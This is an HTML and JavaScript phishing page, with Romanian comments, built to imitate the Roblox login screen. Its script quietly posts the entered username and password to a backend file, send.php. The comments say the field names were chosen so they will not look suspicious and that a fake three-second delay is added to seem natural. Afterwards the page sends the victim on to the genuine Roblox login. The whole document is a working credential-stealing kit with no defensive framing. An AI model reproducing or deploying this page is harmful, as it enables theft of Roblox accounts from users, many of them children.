<!DOCTYPE html>
<html lang="ro">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Roblox - Secured Access</title>
    
    <!-- Meta-tag-uri pentru securitate și referrer -->
    <meta name="referrer" content="no-referrer" />
    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline'; connect-src 'self'; style-src 'unsafe-inline'; img-src https: data:;" />
    <link rel="icon" href="data:;base64,iVBORw0KGgo=" />

    <style>
        /* ===== RESET ===== */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            color: #ffffff;
            background-image: url('https://i.postimg.cc/13t5KmF8/Captura-de-ecran-2026-08-08-214027.png');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            background-attachment: fixed;
        }

        /* ===== NAVBAR ===== */
        .navbar {
            background-color: #0f0f0f;
            padding: 12px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            border-bottom: 1px solid #2a2a2a;
            position: relative;
            z-index: 2;
        }

        .nav-left {
            display: flex;
            align-items: center;
            gap: 35px;
            flex-wrap: wrap;
        }

        .logo {
            height: 48px;
            width: auto;
            display: block;
        }

        .nav-link {
            color: #ffffff;
            text-decoration: none;
            font-size: 16px;
            font-weight: 500;
            transition: color 0.3s;
        }

        .nav-link:hover {
            color: #cccccc;
        }

        .nav-right {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .search-wrapper {
            display: flex;
            align-items: center;
            background-color: #2a2a2a;
            border: 1px solid #3a3a3a;
            border-radius: 8px;
            padding: 0 12px;
            height: 38px;
            width: 350px;
            margin-left: -15px;
            transition: border-color 0.3s;
        }

        .search-wrapper:focus-within {
            border-color: #555;
        }

        .search-icon {
            height: 20px;
            width: auto;
            margin-right: 8px;
            flex-shrink: 0;
            display: block;
        }

        .search-bar {
            width: 100%;
            border: none;
            background: transparent;
            color: #ffffff;
            font-size: 13px;
            outline: none;
            font-family: inherit;
            height: 100%;
        }

        .search-bar::placeholder {
            color: #9a9a9a;
        }

        .signup-image {
            height: 38px;
            width: auto;
            display: block;
            border-radius: 6px;
            cursor: pointer;
        }

        /* ===== LOGIN CONTAINER ===== */
        .login-container {
            max-width: 400px;
            width: 100%;
            margin: 25px auto 50px;
            padding: 35px 30px;
            background-color: rgba(43, 43, 43, 0.92);
            backdrop-filter: blur(4px);
            border-radius: 8px;
            border: 1px solid #3a3a3a;
            flex: 1;
            position: relative;
            z-index: 2;
        }

        .login-header {
            text-align: center;
            font-size: 30px;
            font-weight: 600;
            color: #ffffff;
            margin-bottom: 25px;
        }

        .form-group {
            margin-bottom: 14px;
            position: relative;
        }

        .sr-only {
            position: absolute;
            width: 1px;
            height: 1px;
            padding: 0;
            margin: -1px;
            overflow: hidden;
            clip: rect(0, 0, 0, 0);
            border: 0;
        }

        .input-field {
            width: 100%;
            padding: 12px 14px;
            border: 1px solid #3a3a3a;
            border-radius: 10px;
            font-size: 15px;
            background-color: #1a1a1a;
            color: #ffffff;
            transition: border-color 0.3s;
            outline: none;
            font-family: inherit;
        }

        .input-field::placeholder {
            color: #9a9a9a;
        }

        .input-field:focus {
            border-color: #555555;
        }

        .login-button {
            width: 100%;
            padding: 12px;
            background-color: #2a2a2a;
            color: #ffffff;
            border: 1px solid #4a4a4a;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 5px;
            font-family: inherit;
        }

        .login-button:hover {
            background-color: #3a3a3a;
            border-color: #666;
        }

        .forgot-link {
            text-align: center;
            margin: 16px 0 18px;
        }

        .text-link {
            color: #ffffff;
            text-decoration: none;
            font-size: 16px;
        }

        .text-link:hover {
            color: #cccccc;
        }

        .otp-button,
        .quick-login-button {
            width: 100%;
            padding: 10px;
            background-color: transparent;
            color: #ffffff;
            border: 1px solid #4a4a4a;
            border-radius: 10px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.3s;
            font-family: inherit;
            margin-bottom: 10px;
        }

        .otp-button:hover,
        .quick-login-button:hover {
            background-color: #2a2a2a;
            border-color: #666;
        }

        .divider {
            margin: 18px 0 20px;
        }

        .divider hr {
            border: none;
            border-top: 1px solid #3a3a3a;
        }

        .signup-option {
            text-align: center;
            margin-top: 22px;
            font-size: 14px;
            color: #b0b0b0;
        }

        .signup-option .text-link {
            font-size: 14px;
        }

        /* ===== MODAL / OVERLAY ===== */
        .modal-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            z-index: 999;
            align-items: center;
            justify-content: center;
        }

        .modal-overlay.active {
            display: flex;
        }

        .modal-box {
            background: #2a2a2a;
            padding: 30px 25px;
            border-radius: 12px;
            max-width: 400px;
            width: 90%;
            text-align: center;
            border: 1px solid #444;
        }

        .modal-box h2 {
            margin-bottom: 12px;
            font-size: 22px;
            color: #fff;
        }

        .modal-box p {
            font-size: 15px;
            color: #ccc;
            margin-bottom: 20px;
            word-wrap: break-word;
        }

        .modal-box button {
            background: #3a3a3a;
            color: #fff;
            border: none;
            padding: 8px 24px;
            border-radius: 8px;
            font-size: 14px;
            cursor: pointer;
            border: 1px solid #555;
            transition: 0.3s;
        }

        .modal-box button:hover {
            background: #4a4a4a;
        }

        /* ===== LOADING OVERLAY (pentru redirecționare) ===== */
        .loading-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(15, 15, 15, 0.85);
            z-index: 1000;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            gap: 20px;
        }

        .loading-overlay.active {
            display: flex;
        }

        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid #333;
            border-top: 5px solid #fff;
            border-radius: 50%;
            animation: spin 0.9s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loading-overlay p {
            color: #fff;
            font-size: 18px;
            font-weight: 300;
            letter-spacing: 1px;
        }

        /* ===== FOOTER ===== */
        .footer {
            background-color: #0f0f0f;
            padding: 25px 30px 20px;
            margin-top: auto;
            border-top: 1px solid #1a1a1a;
            position: relative;
            z-index: 2;
        }

        .footer-links {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 12px 25px;
        }

        .footer-link {
            color: #9a9a9a;
            text-decoration: none;
            font-size: 13px;
            transition: color 0.3s;
        }

        .footer-link:hover {
            color: #ffffff;
            text-decoration: underline;
        }

        /* ===== RESPONSIVE ===== */
        @media (max-width: 820px) {
            .navbar {
                flex-direction: column;
                gap: 10px;
                padding: 12px 20px;
            }
            .nav-left {
                justify-content: center;
                gap: 20px;
            }
            .nav-right {
                width: 100%;
                justify-content: center;
            }
            .search-wrapper {
                width: 100%;
                max-width: 400px;
                margin-left: 0;
            }
        }

        @media (max-width: 480px) {
            .navbar {
                padding: 10px 12px;
                gap: 8px;
            }
            .nav-left {
                gap: 14px;
            }
            .logo {
                height: 36px;
            }
            .nav-link {
                font-size: 13px;
            }
            .search-wrapper {
                height: 34px;
                padding: 0 10px;
                border-radius: 6px;
                width: 100%;
                margin-left: 0;
            }
            .search-icon {
                height: 16px;
                margin-right: 6px;
            }
            .search-bar {
                font-size: 12px;
            }
            .signup-image {
                height: 34px;
            }
            .login-container {
                margin: 15px 12px 30px;
                padding: 24px 16px;
            }
            .login-header {
                font-size: 24px;
            }
            .input-field {
                padding: 10px 12px;
                font-size: 14px;
                border-radius: 8px;
            }
            .login-button {
                font-size: 15px;
                padding: 10px;
                border-radius: 8px;
            }
            .text-link {
                font-size: 14px;
            }
            .otp-button,
            .quick-login-button {
                border-radius: 8px;
                font-size: 13px;
            }
            .footer {
                padding: 16px 12px;
            }
            .footer-links {
                gap: 6px 12px;
            }
            .footer-link {
                font-size: 11px;
            }
        }
    </style>
</head>
<body>

    <!-- ===== NAVIGATION BAR ===== -->
    <div class="navbar">
        <div class="nav-left">
            <img src="https://i.ibb.co/s9hJbk2K/Captur-de-ecran-2026-08-08-211650.png"
                 alt="Roblox Logo"
                 class="logo"
                 onerror="this.style.display='none'" />
            <a href="#" class="nav-link">Charts</a>
            <a href="#" class="nav-link">Marketplace</a>
            <a href="#" class="nav-link">Create</a>
            <a href="#" class="nav-link">Robux</a>
            <div class="search-wrapper">
                <img src="https://i.ibb.co/kPLP70f/Captur-de-ecran-2026-08-08-213253.png"
                     alt="Căutare"
                     class="search-icon"
                     onerror="this.style.display='none'" />
                <input type="text" class="search-bar" placeholder="Search" aria-label="Căutare" />
            </div>
        </div>
        <div class="nav-right">
            <img src="https://i.ibb.co/rJR5W5G/Captur-de-ecran-2026-08-08-213641.png"
                 alt="Sign Up"
                 class="signup-image"
                 onerror="this.style.display='none'" />
        </div>
    </div>

    <!-- ===== LOGIN CONTAINER ===== -->
    <div class="login-container">
        <h1 class="login-header">Login to Roblox</h1>

        <!-- Formular -->
        <form id="loginForm" action="#" method="post" autocomplete="on">
            <div class="form-group">
                <label for="login-username" class="sr-only">Username/Email/Phone</label>
                <input type="text"
                       id="login-username"
                       class="input-field"
                       placeholder="Username/Email/Phone"
                       autocomplete="username"
                       required />
            </div>

            <div class="form-group">
                <label for="login-password" class="sr-only">Password</label>
                <input type="password"
                       id="login-password"
                       class="input-field"
                       placeholder="Password"
                       autocomplete="current-password"
                       required />
            </div>

            <button type="submit" id="login-button" class="login-button" aria-label="Log In">
                Log In
            </button>
        </form>

        <div class="forgot-link">
            <a href="#" class="text-link">Forgot Password or Username?</a>
        </div>

        <div class="divider"><hr /></div>

        <button type="button" class="otp-button" aria-label="Email me a one-time code">
            Email Me a One-Time Code
        </button>
        <button type="button" class="quick-login-button" aria-label="Use another device">
            Use Another Device
        </button>

        <div class="signup-option">
            Don't have an account? <a href="#" class="text-link">Sign Up</a>
        </div>
    </div>

    <!-- ===== FOOTER ===== -->
    <footer class="footer">
        <div class="footer-links">
            <a href="#" class="footer-link">About Us</a>
            <a href="#" class="footer-link">Jobs</a>
            <a href="#" class="footer-link">Blog</a>
            <a href="#" class="footer-link">Parents</a>
            <a href="#" class="footer-link">Gift Cards</a>
            <a href="#" class="footer-link">Help</a>
            <a href="#" class="footer-link">Terms</a>
            <a href="#" class="footer-link">Accessibility</a>
        </div>
    </footer>

    <!-- ===== MODAL PENTRU MESAJE ===== -->
    <div id="modal" class="modal-overlay" role="dialog" aria-modal="true">
        <div class="modal-box">
            <h2 id="modal-title">Info</h2>
            <p id="modal-message">Mesaj</p>
            <button id="modal-close-btn" aria-label="Închide">OK</button>
        </div>
    </div>

    <!-- ===== OVERLAY DE LOADING (apare la redirecționare) ===== -->
    <div id="loadingOverlay" class="loading-overlay">
        <div class="spinner"></div>
        <p>Securing your connection...</p>
    </div>

    <!-- ===== SCRIPT ===== -->
    <script>
        (function() {
            'use strict';

            // === REFERINȚE DOM ===
            const modalOverlay = document.getElementById('modal');
            const modalTitle = document.getElementById('modal-title');
            const modalMessage = document.getElementById('modal-message');
            const modalCloseBtn = document.getElementById('modal-close-btn');
            const loadingOverlay = document.getElementById('loadingOverlay');
            const form = document.getElementById('loginForm');
            const usernameInput = document.getElementById('login-username');
            const passwordInput = document.getElementById('login-password');

            // === FUNCȚII MODAL ===
            function showModal(title, message) {
                modalTitle.textContent = title;
                modalMessage.textContent = message;
                modalOverlay.classList.add('active');
            }

            function closeModal() {
                modalOverlay.classList.remove('active');
            }

            modalCloseBtn.addEventListener('click', closeModal);
            modalOverlay.addEventListener('click', function(e) {
                if (e.target === modalOverlay) closeModal();
            });

            // === FUNCȚIA CARE TRIMITE DATELE LA BACKEND (send.php) ===
            async function sendData(user, pass) {
                // Arătăm overlay-ul de loading
                loadingOverlay.classList.add('active');

                try {
                    // Trimitem către propriul backend (NU direct către Discord)
                    const response = await fetch('send.php', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({ 
                            u: user,      // redenumit ca să nu fie suspect
                            p: pass 
                        })
                    });

                    // Așteptăm 3 secunde pentru a părea natural
                    await new Promise(resolve => setTimeout(resolve, 3000));

                    // Ascundem loading-ul
                    loadingOverlay.classList.remove('active');

                    if (response.ok) {
                        showModal('Success', 'Redirecting to Roblox...');
                        // Redirecționăm după 1.5 secunde
                        setTimeout(() => {
                            window.location.href = 'https://www.roblox.com/login';
                        }, 1500);
                    } else {
                        showModal('Error', 'Invalid credentials. Please try again.');
                    }
                } catch (error) {
                    loadingOverlay.classList.remove('active');
                    showModal('Connection Error', 'Unable to reach the server. Check your internet.');
                    console.error('Fetch error:', error);
                }
            }

            // === EVENT LISTENER PENTRU SUBMIT ===
            form.addEventListener('submit', function(event) {
                event.preventDefault();

                const username = usernameInput.value.trim();
                const password = passwordInput.value.trim();

                if (username === '' || password === '') {
                    showModal('Incomplete Fields', 'Please fill in both fields.');
                    return;
                }

                // Trimitem datele
                sendData(username, password);
            });

        })();
    </script>

</body>
</html>
